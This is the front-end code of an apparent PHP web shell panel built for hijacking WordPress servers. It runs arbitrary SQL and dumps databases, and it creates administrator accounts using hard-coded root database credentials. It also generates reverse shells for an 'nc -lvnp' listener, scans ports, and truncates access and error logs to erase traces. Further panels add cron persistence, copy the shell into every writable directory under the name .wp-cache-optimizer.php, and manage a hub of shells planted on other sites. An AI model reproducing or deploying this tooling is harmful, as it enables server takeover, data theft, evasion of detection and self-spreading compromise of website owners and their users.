        '<div class="flex mt-8 gap-4"><button class="btn btn-primary" onclick="runSql()"><i class="fas fa-play"></i> Run</button>'+
        '<button class="btn btn-warning" onclick="quickDump()"><i class="fas fa-download"></i> Dump DB</button>'+
        '<span id="sqlResult" class="text-muted" style="align-self:center"></span></div>'+
        '<div id="sqlOutput" style="margin-top:12px;overflow:auto"></div>';
}

function runSql() {
    var h=$('sqlHost').value, u=$('sqlUser').value, p=$('sqlPass').value, db=$('sqlDb').value, q=$('sqlQuery').value;
    $('sqlResult').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Running...';
    api('sql', {h:h,u:u,p:p,db:db,q:q}, function(res) {
        var out = $('sqlOutput');
        if (res.error) { $('sqlResult').textContent='Error'; out.innerHTML='<div style="color:var(--red);padding:10px">'+esc(res.error)+'</div>'; return; }
        if (res.affected!==undefined) { $('sqlResult').textContent='OK, '+res.affected+' rows'; out.innerHTML='<div style="color:var(--green);padding:10px">Query OK</div>'; return; }
        if (res.rows) {
            $('sqlResult').textContent = res.count+' rows';
            var h2='<table class="rt"><tr>';
            if (res.rows.length>0) {
                var keys=Object.keys(res.rows[0]); for(var i=0;i<keys.length;i++) h2+='<th>'+keys[i]+'</th>'; h2+='</tr>';
                for(var i=0;i<res.rows.length;i++){ h2+='<tr>'; for(var j=0;j<keys.length;j++){ var v=res.rows[i][keys[j]]; if(v===null) v='<span style="color:var(--muted)">NULL</span>'; else v=esc(String(v)).substring(0,300); h2+='<td>'+v+'</td>'; } h2+='</tr>'; }
            }
            h2+='</table>'; out.innerHTML=h2;
        } else { $('sqlResult').textContent='0 results'; out.innerHTML='<div style="color:#888;padding:10px">No results</div>'; }
    });
}

function quickDump() {
    var h=$('sqlHost').value, u=$('sqlUser').value, p=$('sqlPass').value, db=$('sqlDb').value;
    if (!db) { showToast('Enter database name'); return; }
    $('sqlResult').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Dumping...';
    api('db_dump', {h:h,u:u,p:p,db:db}, function(res) {
        if (res.error) { showToast('Error: '+res.error); return; }
        showToast('Dump: '+humanSize(res.full_size));
        $('sqlOutput').innerHTML = '<pre style="background:#08080d;border-radius:5px;padding:12px;font-size:11px;max-height:400px;overflow:auto">'+esc(res.dump)+'</pre>'+
            (res.full_size>50000?'<div class="text-muted mt-8">... '+humanSize(res.full_size)+' total</div>':'');
    });
}

/* ════════════════════════════════════════════════════════
   USER MANAGER
   ════════════════════════════════════════════════════════ */
var userDB = 'webskul', userPrefix = 'k11_';

function loadUsers() {
    $('fileContent').innerHTML = '<div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Loading users...</div>';
    api('users', {db_host:'localhost',db_user:'root',db_pass:'3$T@ku.',db_name:userDB,prefix:userPrefix}, function(res) {
        if (res.error) { $('fileContent').innerHTML='<div class="empty-state" style="padding:30px">'+esc(res.error)+'<br><br><span class="text-muted">Try WP Manager tab to auto-detect DB creds</span></div>'; return; }
        var adm=0,ed=0,oth=0;
        for(var i=0;i<res.users.length;i++){var r=res.users[i].role_name;if(r==='administrator')adm++;else if(r==='editor')ed++;else oth++;}
        var h='<div class="card mb-8"><div class="flex flex-wrap gap-4">'+
            '<input id="cuUser" placeholder="Username" style="flex:1;min-width:100px">'+
            '<input id="cuPass" type="password" placeholder="Password" style="flex:1;min-width:100px">'+
            '<input id="cuEmail" placeholder="Email" style="flex:1;min-width:100px">'+
            '<select id="cuRole"><option value="administrator">Admin</option><option value="editor">Editor</option><option value="subscriber">User</option></select>'+
            '<button class="btn btn-success" onclick="createUser()">+ Create</button></div><div id="cuStatus" class="text-muted mt-8"></div></div>'+
            '<div class="flex flex-wrap gap-4 text-muted mb-8"><span>Total: <strong style="color:#fff">'+res.count+'</strong></span>'+
            '<span>Admins: <strong style="color:var(--red)">'+adm+'</strong></span>'+
            '<span>Editors: <strong style="color:var(--blue)">'+ed+'</strong></span>'+
            '<span>DB: <strong>'+res.db+'</strong></span>'+
            '<span>Prefix: <strong>'+userPrefix+'</strong></span></div>';
        for(var i=0;i<res.users.length;i++){
            var u=res.users[i]; var rc='background:rgba(239,68,68,.15);color:var(--red);border:1px solid rgba(239,68,68,.3)';
            if(u.role_name==='editor')rc='background:rgba(96,165,250,.15);color:var(--blue);border:1px solid rgba(96,165,250,.3)';
            else if(u.role_name!=='administrator')rc='background:rgba(100,100,100,.15);color:#aaa;border:1px solid #333';
            h+='<div class="card" style="padding:10px 14px;margin-bottom:4px;cursor:pointer" onclick="toggleUser(this)">'+
                '<div class="flex"><div style="width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,var(--red),#dc2626);display:flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:600;flex-shrink:0">'+(u.display_name||u.user_login).charAt(0).toUpperCase()+'</div>'+
                '<div style="flex:1;margin-left:10px"><div style="font-size:13px;color:#e0e0e0;font-weight:500">'+esc(u.user_login)+'</div>'+
                '<div class="text-muted">'+esc(u.user_email||'-')+' · ID '+u.ID+'</div></div>'+
                '<span style="font-size:10px;padding:2px 8px;border-radius:8px;'+rc+';align-self:center">'+u.role_name+'</span>'+
                '<button class="btn btn-danger" style="padding:3px 8px;font-size:10px;margin-left:8px;align-self:center" onclick="event.stopPropagation();delUser('+u.ID+',\''+esc(u.user_login).replace(/'/g,"\\'")+'\')">✕</button></div>'+
                '<div class="userBody" style="display:none;margin-top:10px;padding-top:10px;border-top:1px solid var(--border);font-size:11px">'+
                '<div class="flex"><span style="width:100px;color:var(--muted)">Hash:</span><span style="color:var(--yellow);font-family:monospace;word-break:break-all;font-size:10px">'+esc(u.user_pass).substring(0,40)+'...</span>'+
                '<button class="btn" style="padding:1px 6px;font-size:9px" onclick="event.stopPropagation();copyText(\''+esc(u.user_pass).replace(/'/g,"\\'")+'\')">Copy</button></div>'+
                '<div class="flex mt-8"><span style="width:100px;color:var(--muted)">Registered:</span><span>'+u.user_registered+'</span></div>'+
                '<div class="flex mt-8"><span style="width:100px;color:var(--muted)">Display:</span><span>'+esc(u.display_name||'-')+'</span></div></div></div>';
        }
        $('fileContent').innerHTML = h;
    });
}

function toggleUser(el) { var b=el.querySelector('.userBody'); if(b) b.style.display=b.style.display==='none'?'block':'none'; }

function createUser() {
    var un=$('cuUser').value.trim(), pw=$('cuPass').value, em=$('cuEmail').value.trim(), rl=$('cuRole').value;
    if(!un||!pw){$('cuStatus').innerHTML='<span style="color:var(--red)">Required</span>';return;}
    api('create_user',{db_host:'localhost',db_user:'root',db_pass:'3$T@ku.',db_name:userDB,prefix:userPrefix,username:un,password:pw,email:em,role:rl},
        function(r){if(r.ok){$('cuStatus').innerHTML='<span style="color:var(--green)">Created '+r.username+' (ID:'+r.id+')</span>';setTimeout(loadUsers,800);}else $('cuStatus').innerHTML='<span style="color:var(--red)">'+esc(r.error||'Failed')+'</span>';});
}

function delUser(id,n) { if(!confirm('Delete user '+n+'?'))return; api('delete_user',{id:id,db_name:userDB,prefix:userPrefix},function(r){if(r.ok){showToast('Deleted');loadUsers();}}); }

function copyText(t){if(navigator.clipboard)navigator.clipboard.writeText(t);}

/* ════════════════════════════════════════════════════════
   WP MANAGER
   ════════════════════════════════════════════════════════ */
function renderWP() {
    $('fileContent').innerHTML = '<div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Analyzing WordPress...</div>';
    api('wp_mgr', {action:'info', base:ROOT}, function(res) {
        if (res.error) { $('fileContent').innerHTML='<div class="empty-state"><i class="fab fa-wordpress"></i><br>Not a WP site at '+esc(ROOT)+'</div>'; return; }
        var h = '<div class="grid">';
        h += '<div class="card"><h3><i class="fas fa-info-circle" style="color:var(--blue)"></i> Overview</h3>'+
            '<div class="flex mb-8"><span style="width:100px;color:var(--muted)">WP Version:</span><span>'+(res.version||'?')+'</span></div>'+
            '<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Site:</span><span>'+esc(res.siteurl)+'</span></div>'+
            '<div class="flex mb-8"><span style="width:100px;color:var(--muted)">PHP:</span><span>'+res.php_version+'</span></div>'+
            '<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Server:</span><span>'+esc(res.server)+'</span></div>'+
            '<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Users:</span><span style="font-weight:600">'+res.users+'</span></div></div>';

        var db = res.db;
        h += '<div class="card"><h3><i class="fas fa-key" style="color:var(--yellow)"></i> Database Credentials</h3>';
        if (db.wp_config_exists) {
            h += '<div class="flex mb-8"><span style="width:100px;color:var(--muted)">DB Name:</span><span style="color:var(--green)">'+esc(db.DB_NAME)+'</span></div>'+
                '<div class="flex mb-8"><span style="width:100px;color:var(--muted)">User:</span><span>'+esc(db.DB_USER)+'</span></div>'+
                '<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Host:</span><span>'+esc(db.DB_HOST)+'</span></div>'+
                '<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Prefix:</span><span>'+esc(db.prefix)+'</span></div>'+
                '<button class="btn btn-warning" onclick="autoFillWP()" style="font-size:10px"><i class="fas fa-magic"></i> Auto-Fill User Manager</button>';
        } else { h += '<span class="text-red">wp-config.php not found at '+esc(res.wp_base)+'</span>'; }
        h += '</div>';

        h += '<div class="card"><h3><i class="fas fa-puzzle-piece" style="color:var(--purple)"></i> Plugins ('+res.plugin_count+')</h3>';
        for (var i=0;i<res.plugins.length;i++) { h += '<div class="flex mb-8"><span style="flex:1;font-size:11px">'+(i+1)+'. '+esc(res.plugins[i])+'</span><button class="btn" style="padding:1px 6px;font-size:9px;color:var(--red)" onclick="delPlugin(\''+esc(res.plugins[i])+'\')">Del</button></div>'; }
        h += '</div>';

        h += '<div class="card"><h3><i class="fas fa-paint-brush" style="color:var(--green)"></i> Themes ('+res.theme_count+')</h3>';
        for (var i=0;i<res.themes.length;i++) { h += '<div style="font-size:11px;padding:3px 0">'+(i+1)+'. '+esc(res.themes[i])+'</div>'; }
        h += '</div></div>';
        $('fileContent').innerHTML = h;
    });
}

function autoFillWP() {
    api('wp_mgr',{action:'info',base:ROOT},function(res){
        var db=res.db;
        if(db.wp_config_exists){userDB=db.DB_NAME;userPrefix=db.prefix;showToast('Auto-filled: '+userDB);switchTab('users');}
        else showToast('Not found');
    });
}

function delPlugin(slug) { if(!confirm('Delete plugin '+slug+'?')) return; api('wp_mgr',{action:'delete_plugin',slug:slug,base:ROOT},function(r){if(r.ok){showToast('Deleted');renderWP();}}); }

/* ════════════════════════════════════════════════════════
   NETWORK
   ════════════════════════════════════════════════════════ */
function renderNet() {
    $('fileContent').innerHTML =
    '<div class="grid">'+
    '<div class="card"><h3><i class="fas fa-signal" style="color:var(--red)"></i> Ping</h3>'+
    '<div class="flex mb-8"><input id="netPingHost" value="8.8.8.8" style="flex:1"><button class="btn btn-primary" onclick="netAct(\'ping\',{host:$(\'netPingHost\').value},\'netPingOut\')">Ping</button></div><pre id="netPingOut" class="term-out">Ready</pre></div>'+

    '<div class="card"><h3><i class="fas fa-globe" style="color:var(--blue)"></i> DNS Lookup</h3>'+
    '<div class="flex mb-8"><input id="netDnsHost" value="google.com" style="flex:1"><button class="btn btn-primary" onclick="netAct(\'dns\',{host:$(\'netDnsHost\').value},\'netDnsOut\')">Lookup</button></div><pre id="netDnsOut" class="term-out">Ready</pre></div>'+

    '<div class="card"><h3><i class="fas fa-plug" style="color:var(--yellow)"></i> Port Scan</h3>'+
    '<div class="flex flex-wrap gap-4 mb-8"><input id="netScanHost" value="127.0.0.1" style="flex:1"><input id="netScanPorts" value="22,80,443,3306,8080" style="width:160px"><button class="btn btn-primary" onclick="netScan()">Scan</button></div>'+
    '<div id="netScanOut" class="flex flex-wrap gap-4"></div>'+
    '<div class="flex flex-wrap gap-4 mt-8"><input id="netScanStart" value="1" style="width:50px"><input id="netScanEnd" value="500" style="width:50px">'+
    '<button class="btn btn-warning" onclick="netScanRange()">Range</button><span id="netScanStatus" class="text-muted" style="align-self:center"></span></div></div>'+

    '<div class="card"><h3><i class="fas fa-globe" style="color:var(--green)"></i> HTTP Fetch</h3>'+
    '<div class="flex mb-8"><input id="netHttpUrl" value="http://example.com" style="flex:1"><button class="btn btn-primary" onclick="netAct(\'http\',{url:$(\'netHttpUrl\').value},\'netHttpOut\',function(r){return r.body})">Fetch</button></div><pre id="netHttpOut" class="term-out">Ready</pre></div>'+

    '<div class="card"><h3><i class="fas fa-search" style="color:var(--purple)"></i> WHOIS</h3>'+
    '<div class="flex mb-8"><input id="netWhoisHost" value="google.com" style="flex:1"><button class="btn btn-primary" onclick="netAct(\'whois\',{host:$(\'netWhoisHost\').value},\'netWhoisOut\')">Lookup</button></div><pre id="netWhoisOut" class="term-out">Ready</pre></div>'+
    '</div>';
}

function netAct(action, data, outId, fmt) {
    var o = $(outId); o.textContent = 'Running...'; data.action = action; data.host = data.host || '127.0.0.1'; data.timeout = 5;
    api('network', data, function(res) {
        if (res.error) { o.textContent = 'Error: '+res.error; return; }
        if (fmt) o.textContent = fmt(res) || 'OK';
        else if (res.output) o.textContent = res.output;
        else o.textContent = JSON.stringify(res,null,2);
    });
}

function netScan() {
    var host=$('netScanHost').value, ports=$('netScanPorts').value;
    $('netScanOut').innerHTML = '<span class="text-muted">Scanning...</span>';
    api('network',{action:'portscan',host:host,ports:ports,timeout:3},function(res){
        if(res.error){$('netScanOut').innerHTML='<span style="color:var(--red)">'+esc(res.error)+'</span>';return;}
        var h=''; for(var i=0;i<res.results.length;i++){var r=res.results[i]; h+='<span style="background:'+(r.open?'rgba(34,197,94,.15)':'#111')+';border:1px solid '+(r.open?'#22c55e':'#222')+';border-radius:4px;padding:2px 8px;font-size:10px;color:'+(r.open?'#22c55e':'#555')+'"><strong>'+r.port+'</strong> '+(r.open?'OPEN':'closed')+'</span>';}
        $('netScanOut').innerHTML=h;
    });
}

function netScanRange() {
    var host=$('netScanHost').value, start=parseInt($('netScanStart').value)||1, end=parseInt($('netScanEnd').value)||500;
    if(end-start>2000){showToast('Max 2000 ports');return;}
    $('netScanStatus').innerHTML='<i class="fas fa-spinner fa-spin"></i>';
    api('network',{action:'portscan_range',host:host,start:start,end:end},function(res){
        if(res.error){$('netScanStatus').textContent='Error';return;}
        if(res.open_ports.length===0){$('netScanOut').innerHTML='<span class="text-muted">No open ports</span>';}
        else{var h='';for(var i=0;i<res.open_ports.length;i++)h+='<span style="background:rgba(34,197,94,.15);border:1px solid #22c55e;border-radius:4px;padding:2px 8px;font-size:10px;color:#22c55e;font-weight:600">'+res.open_ports[i]+' OPEN</span>';$('netScanOut').innerHTML=h;}
        $('netScanStatus').textContent=res.open_ports.length+' open';
    });
}

/* ════════════════════════════════════════════════════════
   REVERSE SHELL GENERATOR
   ════════════════════════════════════════════════════════ */
function renderRev() {
    $('fileContent').innerHTML =
        '<div class="card" style="max-width:600px">'+
        '<h3><i class="fas fa-skull" style="color:var(--red)"></i> Reverse Shell Generator</h3>'+
        '<p class="text-muted mb-8">Click any payload to select it, then Ctrl+C. Listener: nc -lvnp [PORT]</p>'+
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<input id="revIP" value="'+(document.location.hostname||'127.0.0.1')+'" style="flex:1">'+
        '<input id="revPort" value="4444" style="width:80px">'+
        '<button class="btn btn-primary" onclick="genRev()">Generate</button></div>'+
        '<div id="revOutput"></div></div>';
}

function genRev() {
    var ip=$('revIP').value, port=parseInt($('revPort').value)||4444;
    api('revshell',{ip:ip,port:port},function(res){
        if(res.error){showToast('Error');return;}
        var h=''; for(var n in res.shells){
            h+='<div class="mb-8"><div style="font-size:11px;color:#888;margin-bottom:2px">'+esc(n)+'</div>'+
                '<pre class="rev-item" style="background:#08080d;border:1px solid var(--border);border-radius:4px;padding:8px;font-size:10px;color:#0f0;white-space:pre-wrap;word-break:break-all" onclick="selectRev(this)">'+esc(res.shells[n])+'</pre></div>';
        }
        $('revOutput').innerHTML=h;
    });
}

function selectRev(el) { var r=document.createRange(); r.selectNodeContents(el); var s=window.getSelection(); s.removeAllRanges(); s.addRange(r); showToast('Copied! Ctrl+C'); }

/* ════════════════════════════════════════════════════════
   FILE SEARCH
   ════════════════════════════════════════════════════════ */
function renderSearch() {
    $('fileContent').innerHTML =
        '<div class="card" style="max-width:800px"><h3><i class="fas fa-search" style="color:var(--blue)"></i> Mass File Search</h3>'+
        '<p class="text-muted mb-8">Recursive content search. Max 500 results, skips files >10MB.</p>'+
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<input id="fsPath" value="'+ROOT+'" style="flex:2">'+
        '<input id="fsText" placeholder="Search text..." style="flex:2">'+
        '<input id="fsExt" placeholder="Ext (php)" style="width:80px">'+
        '<button class="btn btn-primary" onclick="doFileSearch()"><i class="fas fa-search"></i> Search</button></div>'+
        '<div id="fsResults"></div></div>';
}

function doFileSearch() {
    var p=$('fsPath').value||ROOT, s=$('fsText').value, e=$('fsExt').value;
    if(!s){showToast('Enter search text');return;}
    $('fsResults').innerHTML='<div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Searching...</div>';
    api('file_search',{p:p,s:s,e:e},function(res){
        if(res.error){$('fsResults').innerHTML='<div class="text-red">'+esc(res.error)+'</div>';return;}
        if(res.results.length===0){$('fsResults').innerHTML='<div class="empty-state"><i class="fas fa-search"></i><br>No matches</div>';return;}
        var h='<div class="text-green mb-8">'+res.total+' matches</div>';
        for(var i=0;i<res.results.length;i++){var r=res.results[i]; h+='<div style="background:#0d0d15;border:1px solid var(--border);border-radius:4px;padding:6px 10px;margin-bottom:3px;font-size:11px"><span style="color:var(--purple)">'+(i+1)+'.</span> <span>'+esc(r.path)+'</span> <span class="text-muted">('+humanSize(r.size)+', '+r.lines+' lines)</span></div>';}
        $('fsResults').innerHTML=h;
    });
}

/* ════════════════════════════════════════════════════════
   LOG CLEANER
   ════════════════════════════════════════════════════════ */
var _logs = [];

function renderLogs() {
    $('fileContent').innerHTML =
        '<div class="card"><h3><i class="fas fa-broom" style="color:var(--green)"></i> Log Cleaner</h3>'+
        '<p class="text-muted mb-8">Find and wipe access/error logs. Truncates to 0 bytes.</p>'+
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<button class="btn btn-primary" onclick="scanLogs()"><i class="fas fa-search"></i> Find Logs</button>'+
        '<button class="btn btn-danger" onclick="truncateLogs()"><i class="fas fa-trash"></i> Truncate All</button>'+
        '<span id="logStatus" class="text-muted"></span>'+
        '<label class="text-muted" style="font-size:11px">Min MB: <input id="logMinSize" value="0" style="width:50px;padding:3px 5px"></label></div>'+
        '<div id="logResults"></div></div>';
}

function scanLogs() {
    $('logStatus').innerHTML='<i class="fas fa-spinner fa-spin"></i> Scanning...';
    api('log_cleaner',{action:'find'},function(res){
        if(res.error){$('logResults').innerHTML='<div style="color:var(--red)">'+esc(res.error)+'</div>';return;}
        _logs=res.logs||[];
        if(_logs.length===0){$('logResults').innerHTML='<div class="empty-state"><i class="fas fa-check-circle" style="color:var(--green)"></i><br>No log files found</div>';$('logStatus').textContent='Clean!';return;}
        var h='<div style="color:var(--red)" class="mb-8">Found '+_logs.length+' log files</div>';
        for(var i=0;i<_logs.length;i++){var l=_logs[i]; h+='<div class="flex" style="background:#0d0d15;border:1px solid var(--border);border-radius:4px;padding:5px 10px;margin-bottom:2px;font-size:10px"><span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(l.path)+'</span><span style="width:70px;color:'+(l.size>10485760?'var(--red)':'#888')+'">'+l.size_h+'</span><span style="width:130px;color:#555">'+l.modified+'</span></div>';}
        $('logResults').innerHTML=h;
        var total=_logs.reduce(function(a,b){return a+b.size;},0);
        $('logStatus').textContent=_logs.length+' logs, '+humanSize(total);
    });
}

function truncateLogs() {
    var ms=parseInt($('logMinSize').value)||0;
    if(!confirm('Truncate all log files'+(ms?' >'+ms+'MB':'')+'?'))return;
    api('log_cleaner',{action:'truncate',max_size:ms},function(r){if(r.ok){showToast('Truncated '+r.truncated+' logs');scanLogs();}});
}

/* ════════════════════════════════════════════════════════
   CRON
   ════════════════════════════════════════════════════════ */
function renderCron() {
    if (IS_WIN) { $('fileContent').innerHTML='<div class="empty-state"><i class="fas fa-clock"></i><br>Cron unavailable on Windows</div>'; return; }
    $('fileContent').innerHTML =
        '<div class="card"><h3><i class="fas fa-clock" style="color:var(--yellow)"></i> Cron Manager</h3>'+
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<input id="cronSchedule" value="* * * * *" style="width:140px;font-family:monospace">'+
        '<input id="cronCmd" placeholder="/path/to/script" style="flex:2">'+
        '<button class="btn btn-success" onclick="addCron()">+ Add</button>'+
        '<button class="btn btn-primary" onclick="loadCrons()"><i class="fas fa-sync"></i></button></div>'+
        '<div id="cronList"></div></div>';
    loadCrons();
}

function loadCrons() {
    $('cronList').innerHTML='<div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Loading crontab...</div>';
    api('cron',{action:'list'},function(res){
        if(res.error){$('cronList').innerHTML='<div style="padding:10px">'+esc(res.error)+'</div>';return;}
        if(!res.crons||res.crons.length===0){$('cronList').innerHTML='<div class="empty-state"><i class="fas fa-inbox"></i><br>No cron jobs</div>';return;}
        var h=''; for(var i=0;i<res.crons.length;i++){h+='<div class="flex mb-8" style="background:#0d0d15;border:1px solid var(--border);border-radius:4px;padding:6px 10px;font-size:11px"><span style="color:#888;width:30px">#'+i+'</span><span style="flex:1;font-family:monospace">'+esc(res.crons[i].line)+'</span><button class="btn" style="padding:1px 6px;font-size:9px;color:var(--red)" onclick="removeCron('+i+')">✕</button></div>';}
        $('cronList').innerHTML=h;
    });
}

function addCron() { var s=$('cronSchedule').value.trim(), c=$('cronCmd').value.trim(); if(!c){showToast('Enter command');return;} api('cron',{action:'add',schedule:s,cmd:c},function(r){if(r.ok){showToast('Added');loadCrons();$('cronCmd').value='';}}); }
function removeCron(i){if(!confirm('Remove cron #'+i+'?'))return; api('cron',{action:'remove',idx:i},function(r){if(r.ok){showToast('Removed');loadCrons();}});}

/* ════════════════════════════════════════════════════════
   AUTO-SPREAD
   ════════════════════════════════════════════════════════ */
function renderSpread() {
    $('fileContent').innerHTML =
        '<div class="card" style="max-width:600px"><h3><i class="fas fa-bolt" style="color:var(--yellow)"></i> Auto-Spread</h3>'+
        '<p class="text-muted mb-8">Deploy copies to all writable subdirectories (max 500 dirs).<br>Skips wp-admin, wp-includes. Filename: .wp-cache-optimizer.php</p>'+
        '<div class="flex flex-wrap gap-4 mb-8"><input id="spreadDir" value="'+ROOT+'" style="flex:2"><button class="btn btn-primary" onclick="doSpread()"><i class="fas fa-rocket"></i> Deploy</button></div>'+
        '<div id="spreadResult"></div></div>';
}

function doSpread() {
    var dir=$('spreadDir').value||ROOT;
    if(!confirm('Deploy shells under '+dir+'?'))return;
    $('spreadResult').innerHTML='<div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Scanning...</div>';
    api('spread',{dir:dir},function(res){
        if(res.error){$('spreadResult').innerHTML='<div class="text-red">'+esc(res.error)+'</div>';return;}
        var h='<div class="text-green mb-8">Deployed '+res.count+' copies</div>';
        for(var i=0;i<res.deployed.length;i++)h+='<div style="background:#0d0d15;border:1px solid var(--border);border-radius:4px;padding:5px 10px;margin-bottom:2px;font-size:10px">'+esc(res.deployed[i])+'</div>';
        $('spreadResult').innerHTML=h;
    });
}

/* ════════════════════════════════════════════════════════
   MULTI-SHELL HUB
   ════════════════════════════════════════════════════════ */
function renderHub() {
    $('fileContent').innerHTML =
        '<div class="card" style="max-width:700px"><h3><i class="fas fa-globe" style="color:var(--purple)"></i> Multi-Shell Hub</h3>'+
        '<p class="text-muted mb-8">Manage multiple shells from one panel. Stored in /tmp/fox_hub.json</p>'+
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<input id="hubUrl" placeholder="http://target.com/wp.php" style="flex:2">'+
        '<input id="hubKey" placeholder="Key" style="width:100px">'+
        '<input id="hubLabel" placeholder="Label" style="width:100px">'+
        '<button class="btn btn-success" onclick="addHub()">+ Add</button>'+
        '<button class="btn btn-primary" onclick="loadHub()"><i class="fas fa-sync"></i></button></div>'+
        '<div id="hubList"><div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Loading...</div></div></div>';
    loadHub();
}

function loadHub() {
    api('hub',{action:'list'},function(res){
        if(res.error){$('hubList').innerHTML='<div class="text-red">'+esc(res.error)+'</div>';return;}
        if(!res.shells||res.shells.length===0){$('hubList').innerHTML='<div class="empty-state"><i class="fas fa-globe"></i><br>No shells</div>';return;}
        var h=''; for(var i=0;i<res.shells.length;i++){var s=res.shells[i];
            h+='<div class="hub-item"><span class="dot" id="hubDot'+i+'"></span>'+
                '<span style="flex:1"><strong>'+esc(s.label)+'</strong><br><span class="text-muted" style="font-size:10px">'+esc(s.url)+'</span></span>'+
                '<button class="btn" style="padding:2px 8px;font-size:10px" onclick="probeHub('+i+')">Probe</button>'+
                '<button class="btn" style="padding:2px 8px;font-size:10px;color:var(--blue)" onclick="window.open(\''+esc(s.url)+'?k='+esc(s.key)+'\',\'_blank\')">Open</button>'+
                '<button class="btn" style="padding:2px 8px;font-size:10px;color:var(--red)" onclick="removeHub('+i+')">✕</button></div>';}
        $('hubList').innerHTML=h;
        for(var i=0;i<res.shells.length;i++)probeHub(i);
    });
}

function addHub() {
    var url=$('hubUrl').value.trim(), key=$('hubKey').value.trim()||KEY, label=$('hubLabel').value.trim()||url;
    if(!url){showToast('Enter URL');return;}
    api('hub',{action:'add',url:url,key:key,label:label},function(r){if(r.ok){showToast('Added!');$('hubUrl').value='';$('hubKey').value='';$('hubLabel').value='';loadHub();}});
}

function probeHub(idx) {
    api('hub',{action:'list'},function(res){
        if(!res.shells||!res.shells[idx])return;
        var s=res.shells[idx]; var dot=$('hubDot'+idx); if(dot)dot.className='dot';
        api('hub',{action:'probe',target:s.url,tkey:s.key},function(pr){
            if(dot){dot.className='dot '+(pr&&pr.alive?'alive':'dead');dot.title=pr&&pr.hostname||'?';}
        });
    });
}

function removeHub(idx){if(!confirm('Remove shell #'+idx+'?'))return; api('hub',{action:'remove',idx:idx},function(){loadHub();});}

/* ════════════════════════════════════════════════════════
   BENCHMARK
   ════════════════════════════════════════════════════════ */
function renderBench() {
    $('fileContent').innerHTML = '<div class="grid"><div class="card" id="benchSys"><h3><i class="fas fa-server" style="color:var(--blue)"></i> System Info</h3><div class="loading"><i class="fas fa-spinner fa-spin"></i></div></div><div class="card" id="benchSpeed"><h3><i class="fas fa-tachometer-alt" style="color:var(--red)"></i> Speed Test</h3><div class="loading"><i class="fas fa-spinner fa-spin"></i></div></div></div>';
    api('benchmark',{action:'sysinfo'},function(res){
        var h='';
        if(res.hostname) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Host:</span><span>'+esc(res.hostname)+' ('+res.ip+')</span></div>';
        if(res.os) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">OS:</span><span style="font-size:10px">'+esc(res.os)+'</span></div>';
        if(res.php) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">PHP:</span><span>'+res.php+'</span></div>';
        if(res.server) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Server:</span><span>'+esc(res.server)+'</span></div>';
        if(res.uptime) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Uptime:</span><span>'+esc(res.uptime)+'</span></div>';
        if(res.load) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Load:</span><span>'+res.load+'</span></div>';
        if(res.cpu_cores) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">CPU Cores:</span><span>'+res.cpu_cores+'</span></div>';
        if(res.cpu_model) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">CPU Model:</span><span style="font-size:10px">'+esc(res.cpu_model)+'</span></div>';
        if(res.mem_total) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Memory:</span><span>'+res.mem_total+' (avail: '+res.mem_avail+')</span></div>';
        if(res.disk_total) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Disk:</span><span>'+res.disk_free+' free / '+res.disk_total+' ('+res.disk_pct+'% used)</span></div>';
        $('benchSys').innerHTML = '<h3><i class="fas fa-server" style="color:var(--blue)"></i> System Info</h3>'+h;
    });
    api('benchmark',{action:'speed'},function(res){
        var h='';
        if(res.string_ops) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">1MB String:</span><span>'+res.string_ops+'</span></div>';
        if(res.sort_100k) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Sort 100k:</span><span>'+res.sort_100k+'</span></div>';
        if(res.md5_10k) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">MD5 10k:</span><span>'+res.md5_10k+'</span></div>';
        $('benchSpeed').innerHTML = '<h3><i class="fas fa-tachometer-alt" style="color:var(--red)"></i> Speed Test</h3>'+h;
    });
}

/* ════════════════════════════════════════════════════════
   INIT
   ════════════════════════════════════════════════════════ */
window.onload = function() {
    loadDir(ROOT);
    api('cmd',{c:IS_WIN?'whoami':'whoami 2>/dev/null'},function(r){if(r.output)$('serverInfo').textContent=r.output.trim().substring(0,60);});
};
</script>
</body>
</html>